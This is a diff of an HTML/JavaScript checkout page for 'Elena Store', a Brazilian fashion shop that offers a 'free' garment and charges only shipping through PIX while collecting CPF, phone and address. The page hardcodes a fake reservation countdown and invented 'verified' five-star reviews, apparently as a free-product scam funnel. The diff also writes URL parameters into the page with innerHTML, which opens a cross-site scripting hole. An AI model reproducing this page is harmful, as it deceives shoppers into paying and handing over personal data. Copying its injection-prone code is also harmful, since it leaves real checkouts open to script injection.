@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Checkout Seguro</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>Checkout Seguro — Elena Store</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="checkout.css">
 
     <!-- Meta Pixel Code -->
@@ -27,269 +27,366 @@
 </head>
 <body>
 
-    <header class="header-checkout" style="flex-direction: column; gap: 5px; padding: 15px;">
-        <img src="images/logo.png" alt="Elena Store" style="height: 60px; object-fit: contain; margin-bottom: 5px;" onerror="this.style.display='none'">
-        <div style="font-size: 0.8rem; color: #15b74e; display: flex; align-items: center; gap: 5px;">
-            🔒 Ambiente 100% Seguro
+    <!-- ===== HEADER ===== -->
+    <header class="checkout-header">
+        <div class="logo">
+            <img src="images/logo.png" alt="Elena Store" onerror="this.style.display='none'; this.parentElement.innerHTML='<span class=\'logo-text\'>Elena Store</span>';">
+        </div>
+        <div class="security-badge">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <span>PAGAMENTO<br>100% SEGURO</span>
         </div>
     </header>
 
-    <div class="timer-banner">
-        ⚠️ Suas peças estão reservadas por <span id="timerMin">14</span>:<span id="timerSec">54</span> minutos.
+    <!-- ===== PROMO BAR ===== -->
+    <div class="promo-bar">
+        <div class="promo-shipping">
+            🚚 <span>Frete Grátis para compras acima de <strong>R$500,00</strong></span>
+        </div>
+        <div class="promo-timer">
+            🕒 <span>Carrinho reservado por <span class="timer-value" id="timerDisplay">00:14:54</span></span>
+        </div>
     </div>
 
-    <form class="container-checkout" id="checkoutForm">
+    <!-- ===== MAIN LAYOUT ===== -->
+    <form class="checkout-main" id="checkoutForm" novalidate>
 
-        <!-- Informações Pessoais -->
-        <div class="card">
-            <div class="card-header"><span class="step">1</span> Dados da Emissão e Envio</div>
-            
-            <div class="form-group">
-                <label>E-mail *</label>
-                <input type="email" id="chkEmail" class="form-control" placeholder="seu@email.com" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Nome completo *</label>
-                <input type="text" id="chkNome" class="form-control" placeholder="Digite seu nome" required>
+        <!-- LEFT COLUMN — STEPS -->
+        <div class="checkout-steps">
+
+            <!-- STEP 1: Identificação -->
+            <div class="step-card active" id="step1Card">
+                <div class="step-header">
+                    <div class="step-number">1</div>
+                    <div class="step-title">Identificação</div>
+                    <span class="step-edit" onclick="openStep(1)">Editar</span>
+                </div>
+                <div class="step-body">
+                    <p class="step-description">Utilizaremos seu e-mail para: Identificar seu perfil, histórico de compra, notificação de pedidos e carrinho de compras.</p>
+                    
+                    <div class="form-group">
+                        <label>Nome completo</label>
+                        <input type="text" id="chkNome" class="form-control" placeholder="ex.: Maria de Almeida Cruz" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>E-mail</label>
+                        <input type="email" id="chkEmail" class="form-control" placeholder="ex.: maria@gmail.com" required>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>CPF (Emissão Nota Fiscal)</label>
+                            <input type="text" id="chkCpf" class="form-control" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Celular / WhatsApp</label>
+                        <div class="phone-input-wrapper">
+                            <span class="phone-prefix">+55</span>
+                            <input type="tel" id="chkTelefone" class="form-control" placeholder="(00) 00000-0000" maxlength="15" oninput="maskPhone(this)" required>
+                        </div>
+                    </div>
+
+                    <button type="button" class="btn-step" onclick="goToStep(2)">Ir para Entrega</button>
+                </div>
             </div>
 
-            <div class="form-row">
-                <div class="form-group">
-                    <label>CPF *</label>
-                    <input type="text" id="chkCpf" class="form-control" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)" required>
+            <!-- STEP 2: Entrega -->
+            <div class="step-card locked" id="step2Card">
+                <div class="step-header">
+                    <div class="step-number">2</div>
+                    <div class="step-title">Entrega</div>
+                    <span class="step-subtitle">Preencha suas informações pessoais para continuar</span>
+                    <span class="step-edit" onclick="openStep(2)">Editar</span>
                 </div>
-                <div class="form-group">
-                    <label>Telefone / WhatsApp *</label>
-                    <input type="tel" id="chkTelefone" class="form-control" placeholder="(00) 00000-0000" maxlength="15" oninput="maskPhone(this)" required>
+                <div class="step-body">
+                    <div class="form-group">
+                        <label>CEP</label>
+                        <input type="text" id="chkCep" class="form-control" placeholder="00000-000" maxlength="9" oninput="maskCEP(this)" onblur="buscarCEP(this.value)" required>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group" style="flex: 2;">
+                            <label>Rua / Avenida</label>
+                            <input type="text" id="chkRua" class="form-control" required>
+                        </div>
+                        <div class="form-group" style="flex: 0.7;">
+                            <label>Número</label>
+                            <input type="text" id="chkNumero" class="form-control" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Complemento (opcional)</label>
+                        <input type="text" id="chkComplemento" class="form-control" placeholder="Apto, bloco, etc.">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Bairro</label>
+                            <input type="text" id="chkBairro" class="form-control" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Cidade</label>
+                            <input type="text" id="chkCidade" class="form-control" required>
+                        </div>
+                        <div class="form-group" style="flex: 0.5;">
+                            <label>UF</label>
+                            <input type="text" id="chkEstado" class="form-control" placeholder="SP" maxlength="2" required>
+                        </div>
+                    </div>
+
+                    <!-- Opções de Frete -->
+                    <label style="display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 10px; margin-top: 10px; color: #333;">Escolha o tipo de envio:</label>
+
+                    <label class="shipping-option" id="lblFrete1">
+                        <input type="radio" name="freteOpt" value="16.44" class="shipping-radio">
+                        <div class="shipping-info">
+                            <div class="shipping-title">Entrega Normal</div>
+                            <div class="shipping-desc">Receba em 10 a 15 dias úteis</div>
+                        </div>
+                        <div class="shipping-price">R$ 16,44</div>
+                    </label>
+
+                    <label class="shipping-option selected" id="lblFrete2">
+                        <input type="radio" name="freteOpt" value="21.44" class="shipping-radio" checked>
+                        <div class="shipping-info">
+                            <div class="shipping-title">Frete Expresso</div>
+                            <div class="shipping-desc">Receba em 5 a 8 dias úteis</div>
+                        </div>
+                        <div class="shipping-price">R$ 21,44</div>
+                    </label>
+
+                    <label class="shipping-option" id="lblFrete3">
+                        <input type="radio" name="freteOpt" value="27.93" class="shipping-radio">
+                        <div class="shipping-info">
+                            <div class="shipping-title">SEDEX</div>
+                            <div class="shipping-desc">Receba em 2 a 4 dias úteis</div>
+                        </div>
+                        <div class="shipping-price">R$ 27,93</div>
+                    </label>
+
+                    <button type="button" class="btn-step" onclick="goToStep(3)">Ir para Pagamento</button>
                 </div>
             </div>
-            
-            <div class="form-group" style="margin-top: 10px; border-top: 1px dashed #e0e0e0; padding-top: 15px;">
-                <label>CEP *</label>
-                <input type="text" id="chkCep" class="form-control" placeholder="00000-000" maxlength="9" oninput="maskCEP(this)" onblur="buscarCEP(this.value)" required>
+
+            <!-- STEP 3: Pagamento -->
+            <div class="step-card locked" id="step3Card">
+                <div class="step-header">
+                    <div class="step-number">3</div>
+                    <div class="step-title">Pagamento</div>
+                    <span class="step-subtitle">Preencha suas informações de entrega para continuar</span>
+                    <span class="step-edit" onclick="openStep(3)">Editar</span>
+                </div>
+                <div class="step-body">
+                    <div class="pix-info-box">
+                        <p>⚡ Pagamento PIX aprovado na hora!</p>
+                        <p>Sua compra será aprovada em até 10 segundos para envio imediato.</p>
+                    </div>
+
+                    <div class="pix-container" id="pixContainer">
+                        <p style="font-weight: bold; color: #333;">Escaneie o QR Code abaixo:</p>
+                        <img id="pixQrcode" src="" alt="QR Code PIX">
+                        <p style="font-weight: bold; color: #333; margin-top: 10px;">Ou copie o código:</p>
+                        <div class="pix-copy-row">
+                            <input type="text" id="pixCode" class="form-control" readonly>
+                            <button type="button" onclick="copiarPix()">Copiar</button>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-submit-pix" id="btnSubmit">
+                        ⚡ GERAR CÓDIGO PIX
+                    </button>
+                    <div class="secure-text">🔒 Suas informações financeiras são protegidas rigorosamente pela plataforma.</div>
+                </div>
             </div>
-            <div class="form-row">
-                <div class="form-group" style="flex: 2;">
-                    <label>Rua / Avenida *</label>
-                    <input type="text" id="chkRua" class="form-control" required>
-                </div>
-                <div class="form-group" style="flex: 1;">
-                    <label>Número *</label>
-                    <input type="text" id="chkNumero" class="form-control" required>
-                </div>
-            </div>
-            <div class="form-row">
-                <div class="form-group">
-                    <label>Bairro *</label>
-                    <input type="text" id="chkBairro" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label>Cidade *</label>
-                    <input type="text" id="chkCidade" class="form-control" required>
-                </div>
-                <div class="form-group" style="flex: 0.5;">
-                    <label>UF *</label>
-                    <input type="text" id="chkEstado" class="form-control" placeholder="SP" maxlength="2" required>
-                </div>
-            </div>
+
         </div>
 
-        <!-- Resumo do Pedido -->
-        <div class="card">
-            <div class="card-header"><span class="step">2</span> Resumo do Pedido</div>
-            
-            <div class="summary-item">
-                <img src="" id="chkImg" class="summary-img" alt="Produto" onerror="this.src='images/giftbox.png'">
-                <div class="summary-details">
-                    <div class="summary-title" id="chkTitle">Carregando produto...</div>
-                    <div id="chkOptions" style="font-size: 0.8rem; color: #666; margin-bottom: 6px; font-weight: 500;"></div>
-                    <div class="summary-price">TOTALMENTE GRÁTIS</div>
-                </div>
-            </div>
+        <!-- RIGHT COLUMN — SUMMARY -->
+        <div class="checkout-sidebar">
 
-            <!-- Frete Options -->
-            <label class="shipping-option" id="lblFrete1">
-                <input type="radio" name="freteOpt" value="16.44" class="shipping-radio">
-                <div class="shipping-info">
-                    <div class="shipping-title">Entrega Normal</div>
-                    <div class="shipping-desc">Receba em 10 a 15 dias úteis</div>
-                </div>
-                <div class="shipping-price">R$ 16,44</div>
-            </label>
+            <!-- Summary Card -->
+            <div class="summary-card">
+                <div class="summary-header">RESUMO</div>
 
-            <label class="shipping-option selected" id="lblFrete2">
-                <input type="radio" name="freteOpt" value="21.44" class="shipping-radio" checked>
-                <div class="shipping-info">
-                    <div class="shipping-title">Frete Expresso</div>
-                    <div class="shipping-desc">Receba em 5 a 8 dias úteis</div>
+                <!-- Coupon -->
+                <div class="coupon-section">
+                    <div class="coupon-label">Tem um cupom?</div>
+                    <div class="coupon-row">
+                        <input type="text" placeholder="Código do cupom" id="couponInput">
+                        <button type="button">Adicionar</button>
+                    </div>
                 </div>
-                <div class="shipping-price">R$ 21,44</div>
-            </label>
 
-            <label class="shipping-option" id="lblFrete3">
-                <input type="radio" name="freteOpt" value="27.93" class="shipping-radio">
-                <div class="shipping-info">
-                    <div class="shipping-title">SEDEX</div>
-                    <div class="shipping-desc">Receba em 2 a 4 dias úteis</div>
+                <!-- Cashback -->
+                <div class="cashback-badge">
+                    💰 <span><strong>10%</strong> de cashback para a próxima compra</span>
                 </div>
-                <div class="shipping-price">R$ 27,93</div>
-            </label>
 
-            <!-- Totais -->
-            <div style="margin-top: 20px;">
-                <div class="totals-row">
-                    <span>Subtotal</span>
-                    <span>R$ 0,00</span>
+                <!-- Totals -->
+                <div class="summary-totals">
+                    <div class="totals-row">
+                        <span>Produtos</span>
+                        <span>R$ 0,00</span>
+                    </div>
+                    <div class="totals-row">
+                        <span>Frete</span>
+                        <span id="valorFreteVisual">R$ 21,44</span>
+                    </div>
+                    <div class="totals-row total-final">
+                        <span>Total</span>
+                        <span id="valorTotalFinal">R$ 21,44</span>
+                    </div>
                 </div>
-                <div class="totals-row">
-                    <span>Taxa de Frete</span>
-                    <span id="valorFreteVisual">R$ 21,44</span>
-                </div>
-                <div class="totals-row grand-total">
-                    <span>Total a pagar</span>
-                    <span id="valorTotalFinal">R$ 21,44</span>
-                </div>
-            </div>
-        </div>
 
-        <!-- Pagamento -->
-        <div class="card">
-            <div class="card-header"><span class="step">3</span> Pagamento Seguro</div>
-            
-            <!-- Dados Pix -->
-            <div class="payment-content active" id="tabPix">
-                <div style="text-align: center; padding: 15px; background: #f0fdf6; border-radius: 8px; border: 1px solid #71d8ab; margin-bottom: 20px;">
-                    <p style="color:#00a85f; font-weight: 600; margin-bottom: 10px;">⚡ Pagamento PIX aprovado na hora!</p>
-                    <p style="font-size: 0.85rem; color: #555;">Sua compra será aprovada em até 10 segundos para envio imediato.</p>
-                </div>
-                <div id="pixContainer" style="display: none; text-align: center; margin-bottom: 20px;">
-                    <p style="font-weight: bold; color: #333;">Escaneie o QR Code abaixo:</p>
-                    <img id="pixQrcode" src="" alt="QR Code PIX" style="max-width: 200px; margin: 15px auto;">
-                    <p style="font-weight: bold; color: #333; margin-top: 10px;">Ou copie o código:</p>
-                    <div style="display: flex; gap: 10px; margin-top: 5px;">
-                        <input type="text" id="pixCode" class="form-control" readonly style="font-size: 0.8rem; background: #f9f9f9;">
-                        <button type="button" onclick="copiarPix()" style="padding: 10px 15px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;">Copiar</button>
+                <!-- Product -->
+                <div class="summary-product">
+                    <img src="" id="chkImg" class="summary-product-img" alt="Produto" onerror="this.src='images/giftbox.png'">
+                    <div class="summary-product-info">
+                        <div class="summary-product-name" id="chkTitle">Carregando produto...</div>
+                        <div class="summary-product-variant" id="chkOptions"></div>
+                        <div class="summary-product-qty-price">
+                            <span>Qtd.: 1</span>
+                            <span>GRÁTIS</span>
+                        </div>
                     </div>
                 </div>
             </div>
 
-            <button type="submit" class="btn-submit" id="btnSubmit">
-                ⚡ GERAR CÓDIGO PIX
-            </button>
-            <div class="secure-text">🔒 Suas informações financeiras são protegidas rigorosamente pela plataforma.</div>
-        </div>
-
-        <!-- Avaliações Injetadas no Checkout -->
-        <div class="reviews-section">
-            <h2 class="reviews-title">Avaliações das clientes</h2>
-            
-            <div class="review-card">
-                <div class="review-header">
-                    <div class="review-name">Fernanda Souza <span class="verified-icon">✔️</span></div>
-                    <div class="review-stars">★★★★★</div>
-                </div>
-                <div class="review-text">Adorei a peça! Chegou super rápido. Achei que poderia demorar horrores, mas levou só 6 dias para me entregarem. Perfeito!</div>
-                <div class="review-date">Há 2 dias</div>
-            </div>
-
-            <div class="review-card">
-                <div class="review-header">
-                    <div class="review-name">Juliana Mello <span class="verified-icon">✔️</span></div>
-                    <div class="review-stars">★★★★★</div>
-                </div>
-                <div class="review-text">Meninas, podem confiar, a alfaiataria é incrível e veste super bem, caimento perfeito! Vou comprar mais peças com certeza.</div>
-                <div class="review-date">Há 4 dias</div>
-            </div>
-
-            <div class="review-card">
-                <div class="review-header">
-                    <div class="review-name">Carla Nunes <span class="verified-icon">✔️</span></div>
-                    <div class="review-stars">★★★★★</div>
-                </div>
-                <div class="review-text">Sensacional! Paguei o expresso e chegou rapidinho. Super bem embalado, com cheirinho gostoso na roupa. Estão de parabéns.</div>
-                <div class="review-date">Há 1 semana</div>
-            </div>
-        </div>
-
-        <!-- Informações de Contato e Credibilidade -->
-        <div class="card" style="text-align: center; background: #fafafa; border: 1px solid #eee;">
-            <div style="margin-bottom: 15px;">
-                <img src="images/logo.png" alt="Elena Store" style="max-height: 45px; object-fit: contain;" onerror="this.style.display='none'">
-            </div>
-            <p style="font-size: 0.85rem; color: #555; margin-bottom: 15px; line-height: 1.5;">Moda feminina com elegância e sofisticação. Peças exclusivas para mulheres que valorizam estilo e qualidade.</p>
-            
-            <div style="display: flex; flex-wrap: wrap; gap: 12px; justify-content: center; margin-bottom: 18px;">
-                <div style="background: #fff; border: 1px solid #eaeaea; border-radius: 8px; padding: 12px 16px; font-size: 0.8rem; color: #444; display: flex; align-items: center; gap: 8px;">
-                    📧 contato@elenastore.com.br
-                </div>
-                <div style="background: #fff; border: 1px solid #eaeaea; border-radius: 8px; padding: 12px 16px; font-size: 0.8rem; color: #444; display: flex; align-items: center; gap: 8px;">
-                    📱 (11) 99876-5432
-                </div>
-                <div style="background: #fff; border: 1px solid #eaeaea; border-radius: 8px; padding: 12px 16px; font-size: 0.8rem; color: #444; display: flex; align-items: center; gap: 8px;">
-                    🕐 Seg a Sex: 9h às 18h
-                </div>
-            </div>
-
-            <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; font-size: 0.75rem;">
-                <a href="#" style="color: #888; text-decoration: underline;">Política de Privacidade</a>
-                <a href="#" style="color: #888; text-decoration: underline;">Termos de Uso</a>
-                <a href="#" style="color: #888; text-decoration: underline;">Trocas e Devoluções</a>
-            </div>
         </div>
 
     </form>
 
+    <!-- ===== REVIEWS SECTION ===== -->
+    <div class="reviews-section">
+        <h2 class="reviews-section-title">Avaliações das clientes</h2>
+        <div class="reviews-grid">
+            <div class="review-card">
+                <div class="review-card-header">
+                    <div class="review-card-name">Fernanda Souza <span class="verified-check">✔️</span></div>
+                    <div class="review-card-stars">★★★★★</div>
+                </div>
+                <div class="review-card-text">Adorei a peça! Chegou super rápido. Achei que poderia demorar horrores, mas levou só 6 dias para me entregarem. Perfeito!</div>
+                <div class="review-card-date">Há 2 dias</div>
+            </div>
+            <div class="review-card">
+                <div class="review-card-header">
+                    <div class="review-card-name">Juliana Mello <span class="verified-check">✔️</span></div>
+                    <div class="review-card-stars">★★★★★</div>
+                </div>
+                <div class="review-card-text">Meninas, podem confiar, a alfaiataria é incrível e veste super bem, caimento perfeito! Vou comprar mais peças com certeza.</div>
+                <div class="review-card-date">Há 4 dias</div>
+            </div>
+            <div class="review-card">
+                <div class="review-card-header">
+                    <div class="review-card-name">Carla Nunes <span class="verified-check">✔️</span></div>
+                    <div class="review-card-stars">★★★★★</div>
+                </div>
+                <div class="review-card-text">Sensacional! Paguei o expresso e chegou rapidinho. Super bem embalado, com cheirinho gostoso na roupa. Estão de parabéns.</div>
+                <div class="review-card-date">Há 1 semana</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="checkout-footer">
+        <div class="footer-payment-title">Formas de pagamento</div>
+        <div class="footer-payment-icons">
+            <!-- Visa -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#fff" stroke="#e0e0e0" stroke-width="1"/><path d="M19.4 21h-2.6l1.6-10h2.6l-1.6 10zm11.1-9.7c-.5-.2-1.3-.4-2.3-.4-2.5 0-4.3 1.3-4.3 3.2 0 1.4 1.3 2.2 2.2 2.6 1 .5 1.3.8 1.3 1.2 0 .6-.8 1-1.5 1-.9 0-1.5-.1-2.3-.5l-.3-.2-.3 2c.6.3 1.6.5 2.7.5 2.7 0 4.4-1.3 4.4-3.3 0-1.1-.7-1.9-2.1-2.6-.9-.4-1.4-.7-1.4-1.2 0-.4.5-.8 1.4-.8.8 0 1.4.2 1.9.4l.2.1.3-1.9zm6.6 0h-2c-.6 0-1.1.2-1.3.8l-3.8 9h2.7l.5-1.5h3.3l.3 1.5h2.4l-2.1-9.7zm-3.1 6.3l1.4-3.7.6 3.7h-2zm-21-6.3l-2.5 6.8-.3-1.3c-.5-1.6-2-3.4-3.7-4.3l2.3 8.5h2.7l4-9.7h-2.5z" fill="#1a1f71"/><path d="M13 11.3h-4.1l0 .2c3.2.8 5.3 2.8 6.2 5.1l-.9-4.5c-.2-.6-.6-.8-1.2-.8z" fill="#f9a533"/></svg>
+            </div>
+            <!-- Mastercard -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#fff" stroke="#e0e0e0" stroke-width="1"/><circle cx="19" cy="16" r="8" fill="#eb001b"/><circle cx="29" cy="16" r="8" fill="#f79e1b"/><path d="M24 10.3a8 8 0 0 0-3 5.7 8 8 0 0 0 3 5.7 8 8 0 0 0 3-5.7 8 8 0 0 0-3-5.7z" fill="#ff5f00"/></svg>
+            </div>
+            <!-- Elo -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#fff" stroke="#e0e0e0" stroke-width="1"/><text x="24" y="18" text-anchor="middle" font-family="Arial,sans-serif" font-weight="bold" font-size="10" fill="#00a4e0">elo</text></svg>
+            </div>
+            <!-- Amex -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#016fd0"/><text x="24" y="18" text-anchor="middle" font-family="Arial,sans-serif" font-weight="bold" font-size="7" fill="#fff" letter-spacing="1">AMEX</text></svg>
+            </div>
+            <!-- Diners -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#fff" stroke="#e0e0e0" stroke-width="1"/><circle cx="22" cy="16" r="8" fill="none" stroke="#004a97" stroke-width="1.5"/><line x1="18" y1="12" x2="18" y2="20" stroke="#004a97" stroke-width="1.2"/><line x1="26" y1="12" x2="26" y2="20" stroke="#004a97" stroke-width="1.2"/><text x="34" y="18" text-anchor="middle" font-family="Arial,sans-serif" font-size="5" fill="#004a97">DC</text></svg>
+            </div>
+            <!-- Discover -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#fff" stroke="#e0e0e0" stroke-width="1"/><circle cx="28" cy="16" r="6" fill="#f76b1c"/><text x="16" y="18" text-anchor="middle" font-family="Arial,sans-serif" font-weight="bold" font-size="6" fill="#1a1a1a">D</text></svg>
+            </div>
+            <!-- Hiper -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#fff" stroke="#e0e0e0" stroke-width="1"/><text x="24" y="18" text-anchor="middle" font-family="Arial,sans-serif" font-weight="bold" font-size="8" fill="#00724e">hiper</text></svg>
+            </div>
+            <!-- PIX -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#fff" stroke="#e0e0e0" stroke-width="1"/><path d="M28.8 11.2l-3 3a1.6 1.6 0 0 1-2.3 0l-3-3a1.6 1.6 0 0 0-2.3 0l-2.7 2.7 1.6 1.6 2.7-2.7 3 3a3.2 3.2 0 0 0 4.6 0l3-3 2.7 2.7 1.6-1.6-2.7-2.7a1.6 1.6 0 0 0-2.3 0z" fill="#32bcad"/><path d="M28.8 20.8l-3-3a1.6 1.6 0 0 0-2.3 0l-3 3a1.6 1.6 0 0 1-2.3 0l-2.7-2.7 1.6-1.6 2.7 2.7 3-3a3.2 3.2 0 0 1 4.6 0l3 3 2.7-2.7 1.6 1.6-2.7 2.7a1.6 1.6 0 0 1-2.3 0z" fill="#32bcad"/></svg>
+            </div>
+            <!-- Boleto -->
+            <div class="pay-icon-img">
+                <svg viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="32" rx="4" fill="#fff" stroke="#e0e0e0" stroke-width="1"/><rect x="10" y="8" width="2" height="16" fill="#333"/><rect x="14" y="8" width="1" height="16" fill="#333"/><rect x="17" y="8" width="3" height="16" fill="#333"/><rect x="22" y="8" width="1" height="16" fill="#333"/><rect x="25" y="8" width="2" height="16" fill="#333"/><rect x="29" y="8" width="1" height="16" fill="#333"/><rect x="32" y="8" width="3" height="16" fill="#333"/><rect x="37" y="8" width="1" height="16" fill="#333"/></svg>
+            </div>
+        </div>
+        <div class="footer-legal">
+            © 2026 ELENA STORE — CNPJ: 17.232.324/0002-32<br>
+            WhatsApp: (11) 99876-5432 / E-mail: contato@elenastore.com.br<br>
+            Atendimento: Seg a Sex, 9h às 18h
+        </div>
+    </footer>
+
     <script src="produtos.js"></script>
     <script>
-        // 1. Carregar Dados Dinâmicos do Produto
+        // =============================
+        // 1. Carregar Dados do Produto
+        // =============================
         const urlParams = new URLSearchParams(window.location.search);
         const prodId = parseInt(urlParams.get('id')) || 1;
         const sizeParam = urlParams.get('size');
         const colorParam = urlParams.get('color');
         const imgParam = urlParams.get('img');
-        
+
         const produto = typeof produtos !== 'undefined' ? (produtos.find(p => p.id === prodId) || produtos[0]) : { nome: "Produto Grátis", imagem: "images/giftbox.png" };
-        
+
         document.getElementById('chkTitle').innerText = produto.nome;
         document.getElementById('chkImg').src = imgParam ? decodeURIComponent(imgParam) : produto.imagem;
 
-        let optionsList = [];
-        if (sizeParam) optionsList.push(`Tamanho: ${sizeParam}`);
-        if (colorParam) optionsList.push(`Cor: ${colorParam}`);
-        
-        if (optionsList.length > 0) {
-            document.getElementById('chkOptions').innerText = optionsList.join(' | ');
+        let optionsHtml = [];
+        if (colorParam) optionsHtml.push(`Escolha a cor: ${colorParam}`);
+        if (sizeParam) optionsHtml.push(`Escolha o tamanho: ${sizeParam}`);
+
+        if (optionsHtml.length > 0) {
+            document.getElementById('chkOptions').innerHTML = optionsHtml.join('<br>');
         } else {
             document.getElementById('chkOptions').style.display = 'none';
         }
 
-        // Variável de controle do frete
-        let totalVal = 21.44; 
+        // =============================
+        // 2. Frete Logic
+        // =============================
+        let totalVal = 21.44;
 
-        // 2. Lógica de atualização do Frete
         const radios = document.querySelectorAll('.shipping-radio');
         const labels = document.querySelectorAll('.shipping-option');
-        
+
         labels.forEach(label => {
             label.addEventListener('click', () => {
                 labels.forEach(l => l.classList.remove('selected'));
                 label.classList.add('selected');
-                
                 const input = label.querySelector('input');
                 input.checked = true;
                 totalVal = parseFloat(input.value);
                 atualizarValores();
             });
         });
-        // 3. Atualizar e exibir totais do Frete
+
         function atualizarValores() {
             let totalExib = totalVal.toFixed(2).replace('.', ',');
             const elVisual = document.getElementById('valorFreteVisual');
-            if(elVisual) elVisual.innerText = "R$ " + totalExib;
-            
+            if (elVisual) elVisual.innerText = "R$ " + totalExib;
             const elFinal = document.getElementById('valorTotalFinal');
-            if(elFinal) elFinal.innerText = "R$ " + totalExib;
+            if (elFinal) elFinal.innerText = "R$ " + totalExib;
         }
         atualizarValores();
 
@@ -302,7 +399,89 @@
             value: totalVal
         });
 
-        // 4. Interceptar Submission do Form (Apenas PIX)
+        // =============================
+        // 3. Step Navigation
+        // =============================
+        function goToStep(step) {
+            if (step === 2) {
+                // Validate step 1
+                const nome = document.getElementById('chkNome').value.trim();
+                const email = document.getElementById('chkEmail').value.trim();
+                const cpf = document.getElementById('chkCpf').value.replace(/\D/g, '');
+                const tel = document.getElementById('chkTelefone').value.replace(/\D/g, '');
+
+                if (!nome || !email || cpf.length < 11 || tel.length < 10) {
+                    highlightErrors(1);
+                    return;
+                }
+
+                document.getElementById('step1Card').classList.remove('active');
+                document.getElementById('step1Card').classList.add('completed');
+                document.getElementById('step2Card').classList.remove('locked');
+                document.getElementById('step2Card').classList.add('active');
+
+                document.getElementById('step2Card').scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+
+            if (step === 3) {
+                // Validate step 2
+                const cep = document.getElementById('chkCep').value.replace(/\D/g, '');
+                const rua = document.getElementById('chkRua').value.trim();
+                const numero = document.getElementById('chkNumero').value.trim();
+                const bairro = document.getElementById('chkBairro').value.trim();
+                const cidade = document.getElementById('chkCidade').value.trim();
+                const estado = document.getElementById('chkEstado').value.trim();
+
+                if (!cep || !rua || !numero || !bairro || !cidade || !estado) {
+                    highlightErrors(2);
+                    return;
+                }
+
+                document.getElementById('step2Card').classList.remove('active');
+                document.getElementById('step2Card').classList.add('completed');
+                document.getElementById('step3Card').classList.remove('locked');
+                document.getElementById('step3Card').classList.add('active');
+
+                document.getElementById('step3Card').scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        }
+
+        function openStep(step) {
+            // Reset all steps
+            ['step1Card', 'step2Card', 'step3Card'].forEach((id, i) => {
+                const card = document.getElementById(id);
+                card.classList.remove('active', 'completed');
+                if (i + 1 > step) {
+                    card.classList.add('locked');
+                } else if (i + 1 < step) {
+                    card.classList.add('completed');
+                } else {
+                    card.classList.add('active');
+                }
+            });
+
+            document.getElementById(`step${step}Card`).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        function highlightErrors(step) {
+            let fields = [];
+            if (step === 1) {
+                fields = ['chkNome', 'chkEmail', 'chkCpf', 'chkTelefone'];
+            } else if (step === 2) {
+                fields = ['chkCep', 'chkRua', 'chkNumero', 'chkBairro', 'chkCidade', 'chkEstado'];
+            }
+            fields.forEach(id => {
+                const el = document.getElementById(id);
+                if (!el.value.trim()) {
+                    el.classList.add('error');
+                    setTimeout(() => el.classList.remove('error'), 2500);
+                }
+            });
+        }
+
+        // =============================
+        // 4. PIX Form Submission
+        // =============================
         const form = document.getElementById('checkoutForm');
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -312,7 +491,7 @@
 
             const totalAmountCents = Math.round(totalVal * 100);
             const stateValue = document.getElementById('chkEstado').value.replace(/[^a-zA-Z]/g, '').toUpperCase();
-            
+
             const payload = {
                 amount: totalAmountCents,
                 currency: "BRL",
@@ -335,7 +514,7 @@
                     }
                 },
                 shipping: {
-                    fee: totalAmountCents, // todo o valor é de frete já que a peça é "grátis"
+                    fee: totalAmountCents,
                     address: {
                         street: document.getElementById('chkRua').value,
                         zipCode: document.getElementById('chkCep').value.replace(/\D/g, ''),
@@ -354,45 +533,30 @@
                     }
                 ],
                 pix: {
-                    expiresInDays: 1 // 1 dia
